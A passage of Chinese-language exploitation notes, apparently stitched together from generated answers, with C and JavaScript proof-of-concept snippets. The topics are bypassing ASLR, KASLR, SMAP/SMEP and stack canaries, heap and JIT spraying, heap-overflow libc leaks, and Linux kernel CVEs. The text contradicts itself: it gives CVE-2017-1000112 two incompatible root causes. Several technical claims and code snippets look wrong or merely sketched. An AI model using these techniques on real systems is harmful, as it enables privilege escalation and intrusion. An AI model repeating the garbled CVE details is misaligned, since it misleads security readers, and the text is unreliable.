        addr = (char*)base;
        clock_gettime(CLOCK_MONOTONIC, &start);
        char val = *addr;  // 可能触发SIGSEGV，需要信号处理
        clock_gettime(CLOCK_MONOTONIC, &end);
        diff = (end.tv_sec - start.tv_sec)*1000000000 + (end.tv_nsec - start.tv_nsec);
        if (diff < 100) {  // 快速访问，可能已映射
            printf("Potential mapped: %p\n", addr);
        }
    }
    return 0;
}


注意：实际侧信道攻击需要处理信号（SIGSEGV）以避免崩溃，通常使用`mmap`一个保护页来捕获。此外，现代CPU的预取和乱序执行可能影响计时精度。更高级的侧信道如Spectre可以绕过ASLR，但需要微架构漏洞。

CVE-2017-1000112是Linux内核`net/packet/af_packet.c`中的一个UAF漏洞，影响内核版本3.2至4.12。漏洞成因：`packet_sock`结构体中的`mmap`映射在释放后未正确清理，导致通过`packet_mmap`创建的共享内存区域在套接字关闭后仍然可访问，造成UAF。

绕过SMAP/SMEP：SMAP禁止内核访问用户态页面，SMEP禁止内核执行用户态代码。攻击者需要在内核空间构造ROP链，或利用`ret2dir`技术（通过直接物理内存访问）。

绕过KASLR：通过泄露内核地址（如读取`/proc/kallsyms`或利用侧信道）。

POC原理：
1. 创建一个AF_PACKET套接字，并调用`setsockopt`设置`PACKET_MMAP`，分配一个环形缓冲区。
2. 关闭套接字，但保留对映射内存的引用（通过`mmap`）。
3. 重新分配相同物理页（通过`/proc/self/pagemap`或`memfd`），使得内核对象被重用。
4. 利用UAF修改内核对象，实现权限提升。

以下是一个简化的POC代码片段（仅演示触发UAF）：
c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <sys/mman.h>

int main() {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) { perror("socket"); exit(1); }

    // 设置PACKET_MMAP
    struct tpacket_req req;
    req.tp_block_size = 4096;
    req.tp_block_nr = 1;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = 1;
    setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));

    // mmap映射
    unsigned char *map = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, sock, 0);
    if (map == MAP_FAILED) { perror("mmap"); exit(1); }

    // 关闭套接字，但映射仍然存在
    close(sock);

    // 此时map指向已释放的内核内存，可以读写
    // 后续利用...
    return 0;
}


修复：Linux 4.13中通过增加引用计数和清理映射修复。

Stack Canary的值存储在线程本地存储（TLS）中，具体为__stack_chk_guard变量。在x86-64 Linux上，TLS段通过FS段寄存器访问，__stack_chk_guard位于TLS的固定偏移（如0x28）。如果攻击者能够获得任意写原语（例如堆溢出、格式化字符串写），就可以直接修改TLS中的canary值，使其与栈上的canary一致，从而绕过检查。具体步骤：1. 泄露TLS基址。可以通过读取FS段寄存器或利用已知结构体（如pthread_self）计算。2. 计算__stack_chk_guard的地址（TLS基址+偏移）。3. 利用任意写原语将该地址的值修改为攻击者已知的值（例如0x00000000）。4. 在栈溢出payload中，将栈上的canary字段设置为相同的值。这样函数返回时检查通过。代码示例（假设通过堆溢出覆盖TLS）：
c
// 假设已泄露堆地址和TLS地址
unsigned long long tls_base = leaked_tls;
unsigned long long guard_addr = tls_base + 0x28; // 常见偏移
// 通过堆溢出覆盖guard_addr处的8字节为0
// 堆布局：...
*(unsigned long long*)(heap_overflow_addr) = 0;
// 然后触发栈溢出，payload中canary字段为0

实际利用中，需要精确控制堆布局。另一种方法是通过格式化字符串写：使用%n写入指定地址。例如，先泄露TLS地址，然后使用%<offset>$n写入0。注意，写入操作可能破坏其他TLS变量，需谨慎。该技术常用于绕过Stack Canary，但前提是存在任意写漏洞。现代系统还引入了shadow stack（CET）等硬件保护，但软件层面仍可被覆写。

CVE-2017-1000253是Linux内核中的一个漏洞，允许本地攻击者绕过ASLR（地址空间布局随机化），泄露内核地址。漏洞成因：在Linux内核的mmap系统调用中，当进程请求映射一个文件到栈区域附近时，内核未正确随机化映射地址，导致攻击者可以通过多次mmap操作预测栈的基址。具体来说，在mmap的栈扩展过程中，内核使用了一个可预测的偏移量，使得攻击者能够通过观察映射结果推断出栈地址。受影响版本：Linux kernel 4.12之前的所有版本（包括4.11.x）。POC原理：攻击者首先创建一个线程，然后通过mmap映射一个文件到栈附近，利用MAP_FIXED或MAP_GROWSDOWN标志，观察映射是否成功。由于栈地址未充分随机化，攻击者可以暴力猜测或通过侧信道确定栈地址。一旦获得栈地址，就可以进一步利用其他漏洞（如栈溢出）进行提权。修复：Linux内核4.12引入了补丁，增加了栈映射的随机化熵，并改进了mmap的地址分配算法。具体补丁提交为commit e8c24d3a23a4。代码示例（POC片段）：
c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    // 尝试映射到栈附近
    void *addr = mmap((void*)0x7ffffffde000, 0x1000, PROT_READ|PROT_WRITE,
                      MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        // 通过失败信息推断栈地址
    } else {
        printf("Mapped at %p\n", addr);
    }
    return 0;
}

实际利用中，攻击者会多次尝试不同地址，结合/proc/self/maps或定时攻击来确认栈基址。该漏洞在2017年被发现，影响广泛，但需要本地访问权限。修复后，ASLR的强度得到提升。

Stack Canary的随机值通常存储在TLS（线程本地存储）中，变量名为__stack_chk_guard（在glibc中）。如果攻击者能够获得任意地址写的能力（例如堆溢出、数组越界等），可以直接覆盖该全局变量为已知值，从而使得后续栈溢出时canary检查通过。

技术原理：在x86 Linux中，__stack_chk_guard位于TLS段，其地址可以通过读取fs:0x28（x86-64）或gs:0x14（x86）获得。但更直接的方法是，如果程序存在任意写漏洞，攻击者可以修改该变量。例如，通过堆溢出覆盖某个指针，然后利用该指针写入__stack_chk_guard的地址。一旦canary被改为已知值（如0x00000000），攻击者就可以在栈溢出中填入相同的值，绕过检查。

代码示例（假设存在任意写漏洞）：
c
// 假设存在一个全局数组，有越界写漏洞
char buf[64];
int idx;
void write_at(int index, char value) {
    buf[index] = value; // 无边界检查
}

// 攻击者需要知道__stack_chk_guard的地址（可通过信息泄露获得）
// 假设地址为0x7ffff7dd0b20
void exploit() {
    // 将__stack_chk_guard覆盖为0
    unsigned long target = 0x7ffff7dd0b20;
    for (int i = 0; i < 8; i++) {
        write_at(target + i, 0);
    }
    // 现在canary为0，后续栈溢出可填入0
    char overflow[100];
    // 触发栈溢出，覆盖canary为0
}

实际利用中需结合信息泄露获取__stack_chk_guard地址。修复方法：使用RELRO（Read-Only Relocation）保护TLS段，或使用硬件辅助的Shadow Stack（CET）。

堆喷射（Heap Spray）是一种在ASLR环境下提高漏洞利用成功率的技术，常用于浏览器或JIT引擎漏洞。其核心思想是分配大量包含shellcode或ROP链的堆块，覆盖大范围地址空间，使得攻击者能够预测或控制跳转目标。

技术原理：在浏览器中，JavaScript可以分配大量内存（如通过new Array或字符串拼接）。攻击者创建大量包含NOP sled和shellcode的堆块，每个堆块大小相同，且填充特定模式。由于堆分配器通常从低地址到高地址分配，大量分配后堆空间被填满，地址相对可预测。当漏洞触发（如UAF或堆溢出）导致函数指针被覆盖为某个固定地址（如0x0c0c0c0c），该地址很可能落在喷射的堆块中，从而执行shellcode。ASLR虽然随机化堆基址，但通过喷射大量堆块，覆盖了随机化范围，使得固定地址命中概率很高。

JavaScript示例（简化）：
javascript
var spray = [];
for (var i = 0; i < 100000; i++) {
    var arr = new Array(256);
    for (var j = 0; j < 256; j++) {
        arr[j] = 0x0c0c0c0c; // 填充固定地址
    }
    spray.push(arr);
}
// 触发漏洞，将EIP覆盖为0x0c0c0c0c

实际利用中需考虑堆块对齐和shellcode布局。修复方法：启用高熵ASLR（如64位），或使用堆隔离技术（如PartitionAlloc）。

侧信道攻击利用硬件微架构特性（如缓存时间差、分支预测）来推断内存地址，从而绕过ASLR。Prefetch侧信道是一种利用prefetch指令（如prefetchnta）的时序差异来探测地址是否在缓存中，进而推断内核或用户空间地址布局。

技术原理：攻击者首先通过prefetch指令探测一个地址，如果该地址在缓存中，prefetch执行时间较短；否则较长。通过多次探测，可以逐位推断地址。例如，在用户态，攻击者可以探测libc的某个固定偏移地址，如果该地址在缓存中，说明该页已被映射，从而推断基址。但更常见的是针对内核ASLR：通过探测内核地址空间，找到系统调用表或函数指针。

示例（用户态，简化）：
c
#include <x86intrin.h>
#include <stdio.h>

int probe_address(void *addr) {
    unsigned long long start, end;
    _mm_prefetch(addr, _MM_HINT_NTA);
    start = __rdtsc();
    _mm_prefetch(addr, _MM_HINT_NTA);
    end = __rdtsc();
    return (end - start) < 100; // 阈值判断是否命中缓存
}

int main() {
    // 假设libc基址可能为0x7f0000000000附近
    for (long base = 0x7f0000000000; base < 0x7fffffffffff; base += 0x1000) {
        if (probe_address((void*)(base + 0x100))) { // 探测libc内某函数
            printf("Possible libc base: %lx\n", base);
            break;
        }
    }
    return 0;
}

实际利用需大量探测并统计。修复方法：使用KASLR（内核地址空间布局随机化）并增加熵，同时禁用不必要的prefetch指令（如通过微码更新）。

未初始化内存漏洞发生在程序分配内存后未清零，导致残留的指针或数据被后续操作读取。攻击者可以利用这些残留数据泄露堆地址，从而绕过ASLR。例如，在Linux内核中，CVE-2019-2215（Android Binder漏洞）允许通过未初始化的堆内存泄露内核地址。在用户态，常见场景是malloc后未初始化，然后通过printf或write输出。攻击者可以读取这些残留指针，获得堆基址，进而计算其他对象的地址。以下C代码演示未初始化内存泄露：

c
#include <stdio.h>
#include <stdlib.h>

struct data {
    int id;
    void *ptr;
};

int main() {
    struct data *d = malloc(sizeof(struct data));
    // 未初始化d->ptr，可能包含之前释放的堆地址
    printf("Leaked pointer: %p\n", d->ptr);  // 泄露堆地址
    free(d);
    return 0;
}


攻击者可以通过多次分配和释放来操控堆布局，使得未初始化内存包含特定对象的地址。例如，先分配一个包含指针的对象，释放后，再分配相同大小的结构，未初始化的字段可能包含之前对象的地址。利用此信息，攻击者可以计算堆基址，然后结合堆溢出或UAF漏洞进行利用。防御措施包括：使用calloc代替malloc（清零），或使用编译器选项（如-fsanitize=memory）检测未初始化使用。

堆溢出漏洞发生在堆内存分配时，写入数据超过分配大小，覆盖相邻chunk的元数据。通过精心构造的堆布局，可以泄露堆地址或libc地址。常见技术是利用unsorted bin：当释放一个chunk后，如果它的大小大于fastbin范围，会被放入unsorted bin，其fd和bk指针指向main_arena（位于libc中）。如果存在堆溢出，可以修改下一个chunk的size字段，使其在释放时被放入unsorted bin，然后通过读取该chunk的fd指针泄露libc地址。另一种方法是利用fastbin的fd指针泄露堆地址：通过溢出修改fastbin chunk的fd，使其指向一个已知位置，然后分配两次得到指向该位置的指针，从而泄露堆基址。泄露堆地址后，可以结合其他漏洞（如栈溢出）进行利用，因为堆地址已知后可以计算堆上shellcode的位置。代码示例（C语言演示堆溢出）：
c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *a = malloc(32);
    char *b = malloc(32);
    // 堆溢出：向a写入超过32字节
    memset(a, 'A', 64);  // 覆盖b的chunk头
    // 释放b，使其进入unsorted bin
    free(b);
    // 通过a读取b的fd指针（现在指向main_arena）
    unsigned long *ptr = (unsigned long *)(a+32);
    printf("Leaked libc: %lx\n", *ptr);
    return 0;
}

实际利用中，需要绕过glibc的检查（如size字段的合法性）。常用技术是伪造chunk的size，使其通过free的校验。Python pwntools脚本可以自动化堆布局。泄露libc地址后，可以计算system地址，然后利用另一个漏洞（如栈溢出）执行shell。此方法适用于glibc 2.23及更早版本，新版本引入了tcache，但原理类似。

CVE-2017-1000112是Linux内核中的一个未初始化内存泄露漏洞，影响版本4.8至4.12。漏洞位于AF_PACKET套接字的packet_snd函数中，当发送数据包时，内核未正确初始化某些字段，导致用户态可以通过读取返回的数据包获取内核地址。具体成因：在packet_snd中，内核分配了一个skb（socket buffer），但未清零其中的某些填充字节，这些字节可能包含之前使用的内核指针。攻击者可以通过创建AF_PACKET套接字，发送精心构造的数据包，然后接收回显，从回显数据中提取内核地址。POC原理：1. 创建AF_PACKET套接字；2. 绑定到特定接口；3. 构造一个包含特殊标记的数据包，触发未初始化内存；4. 接收数据包，解析其中的内核地址。泄露的地址通常是内核代码段或数据段地址，从而绕过KASLR。修复：内核在4.12.3版本中通过memset清零相关字段。代码示例（C POC）：
c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

int main() {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = if_nametoindex("lo");
    bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    // 构造数据包，触发漏洞
    char buf[64];
    memset(buf, 'A', sizeof(buf));
    sendto(sock, buf, sizeof(buf), 0, NULL, 0);
    // 接收回显
    char recv_buf[1024];
    recvfrom(sock, recv_buf, sizeof(recv_buf), 0, NULL, NULL);
    // 解析内核地址（偏移根据版本调整）
    unsigned long *ptr = (unsigned long*)(recv_buf+42); // 假设偏移
    printf("Leaked kernel addr: %lx\n", *ptr);
    return 0;
}

注意：实际利用需要精确偏移，且需要root权限。泄露的地址可用于后续提权利用。

Stack Canary的值存储在TLS（Thread Local Storage）中，具体位于线程控制块（TCB）的某个偏移处（如x86_64下，fs:0x28）。如果攻击者能够写入TLS区域，就可以覆盖canary的值，使其与栈上的canary一致，从而绕过检查。常见场景：通过堆溢出或任意写漏洞，修改TLS中的canary值。例如，在glibc中，canary存储在__stack_chk_guard变量中，该变量位于libc的.data段，但实际线程的canary是从该变量复制到TLS的。如果攻击者能够修改__stack_chk_guard，那么所有线程的canary都会改变。但更直接的是修改当前线程的TLS。由于TLS通常位于堆附近（通过mmap分配），如果存在堆溢出，可以覆盖相邻的TLS区域。具体步骤：1. 泄露TLS地址（通过堆泄露或信息泄露）；2. 计算canary在TLS中的偏移（通常为0x28或0x30）；3. 利用堆溢出或任意写，将canary覆盖为已知值（如0x0000000000000000）；4. 在栈溢出时，将栈上的canary也设置为该已知值，从而通过检查。代码示例（假设存在堆溢出，且TLS地址已知）：
c
// 假设我们已经泄露了TLS地址tls_addr
unsigned long *tls_canary = (unsigned long *)(tls_addr + 0x28);
*tls_canary = 0xDEADBEEF; // 覆盖为已知值
// 然后在栈溢出时，在canary位置写入0xDEADBEEF

实际利用中，需要精确控制堆布局，使溢出能够到达TLS区域。此技术常用于绕过glibc的Stack Canary，但需要配合其他漏洞。注意：新版本glibc中，TLS的canary是只读的（通过mprotect），但某些旧版本仍可写。

JIT（Just-In-Time）喷射是一种绕过DEP的技术，常用于浏览器漏洞利用。浏览器引擎（如V8、SpiderMonkey）在执行JavaScript时，会将热点代码编译为机器码并存储在可执行的内存区域（JIT代码页）。攻击者可以通过构造特定的JavaScript代码，使得JIT编译器生成大量包含恶意指令（如shellcode）的代码块。然后，利用内存破坏漏洞（如堆溢出、UAF）控制程序流程，跳转到JIT喷射区域执行shellcode。由于JIT代码页是可执行的，因此绕过了DEP。具体步骤：1. 编写JavaScript代码，使其在JIT编译后产生大量NOP sled和shellcode。例如，使用大量加法、赋值操作，但最终在特定位置插入shellcode字节。2. 触发JIT编译，使这些代码被编译并驻留在内存中。3. 利用漏洞（如CVE-2019-...）覆盖函数指针或返回地址，使其指向JIT喷射区域。4. 执行shellcode。代码示例（JavaScript片段，用于生成喷射）：
javascript
// 构造一个函数，使其JIT编译后产生大量0x90（NOP）和shellcode
function spray() {
    var a = [];
    for (var i = 0; i < 100000; i++) {
        a[i] = 0x90909090; // 在JIT中可能被编译为mov指令，但实际需要更精细控制
    }
